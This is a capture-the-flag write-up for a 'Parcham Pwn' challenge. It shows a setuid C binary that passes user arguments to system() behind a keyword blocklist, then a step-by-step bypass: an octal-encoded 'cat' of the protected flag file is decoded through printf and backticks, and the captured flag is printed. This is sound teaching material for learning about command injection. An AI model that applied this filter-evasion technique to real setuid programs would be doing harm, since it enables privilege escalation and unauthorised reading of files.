# Parcham Pwn first challenge

After logging into the server we see there are two users

```
user1@parcham-os-1:~$ ls /home/

flag  user1
```

If we check the flag user's home directory we see there is a flag file named flag.txt\
it's owner user and group is flag. so we can not read the file


Let's check flag's home directory

```
user1@parcham-os-1:/home/flag$ ls -l 
total 28
-r-sr-xr-x 1 flag flag 17112 Jan 26 22:14 access
-r--r--r-- 1 flag flag  1143 Jan 26 21:15 access.c
-r--r----- 1 flag flag    42 Jan 26 21:21 flag.txt

```


we have a access binary with suid enabled\
which indicates that the effective user of that is flag user\
So if we run code binary with user1 we actually are running it with flag user (because of suid bit set for it's owner flag user)


Let's take a look at access.c

```
user1@parcham-os-1:/home/flag$ cat access.c 
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>

char *gen_cmd(int argc, const char **argv){
        size_t total_size = 1;
        for(int it = 1; it < argc; it++){
                total_size+= strlen(argv[it]);
        }
        char *ret = malloc(total_size);
        total_size = 0;
        for(int it = 1; it < argc; it++){
                size_t len = strlen(argv[it]);
                memcpy(ret+total_size, argv[it], len); 
                total_size+= len;
                ret[total_size] = ' ';
                total_size++;
        }
        ret[total_size] = '\0';
        return ret;
}

int filter(const char *cmd){
        int valid = 1;
        valid &= strstr(cmd, "*") == NULL;
        valid &= strstr(cmd, "sh") == NULL;
        valid &= strstr(cmd, "/") == NULL;
        valid &= strstr(cmd, "home") == NULL;
        valid &= strstr(cmd, "parcham") == NULL;
        valid &= strstr(cmd, "busybox") == NULL;
        valid &= strstr(cmd, ".") == NULL;
        valid &= strstr(cmd, "$") == NULL;
        valid &= strstr(cmd, "flag") == NULL;
        valid &= strstr(cmd, "txt") == NULL;
        return valid;
}


int main(int argc, const char **argv){
        setreuid(UID, UID);
        char *cmd = gen_cmd(argc, argv);
        if (!filter(cmd)){
                exit(-1);
        }
        setenv("PATH", "", 1); 
        system(cmd);
}
```

gen_cmd function just malloc some memory space for our input and concatinate all of them together\
main function sets UID and grab our input then pass it to filter function\
after that set PATH variable to "" and after that it runs our input\
(we know this command now is running as flag user because of suid bit enabled)


so let's check the binary with some input
```
user1@parcham-os-1:/home/flag$ ./access ls
sh: ls: No such file or directory
```

because of setting path variable to "" so we have no access to our commands\
also if we use like this
```
user1@parcham-os-1:/home/flag$ ./access /usr/bin/ls
user1@parcham-os-1:/home/flag$ 
```

we get no result because of filter function

but we also can execute some limited commands with linux built-in commands\
because we can't use flag and txt keywords and other important characters I used octal encoding
So I used printf and backticks and octal encoding for this

Let's go step by step\
we wanna run this command
```
/usr/bin/cat /home/flag/flag.txt
```

1) First encode this with octal encoding
```
/usr/bin/cat /home/flag/flag.txt -> 57 165 163 162 57 142 151 156 57 143 141 164 40 57 150 157 155 145 57 146 154 141 147 57 146 154 141 147 56 164 170 164
```

2) Second use printf to print this octal ascii's in raw format
```
user1@parcham-os-1:/home/flag$ printf "%0b" "\57\165\163\162\57\142\151\156\57\143\141\164\40\57\150\157\155\145\57\146\154\141\147\57\146\154\141\147\56\164\170\164\12"
/usr/bin/cat /home/flag/flag.txt
user1@parcham-os-1:/home/flag$ 
```

3) Thirst use backticks \`\` to execute this command\
(Don't forget to escape backticks characters. otherwise it will first execute the output then pass it to access binary)
```
./access \`'printf "%0b" "\57\165\163\162\57\142\151\156\57\143\141\164\40\57\150\157\155\145\57\146\154\141\147\57\146\154\141\147\56\164\170\164\12"'\`
parcham{bbe147934d55c3695b037b259fed8eca}
```

Finish\
by KRypton.
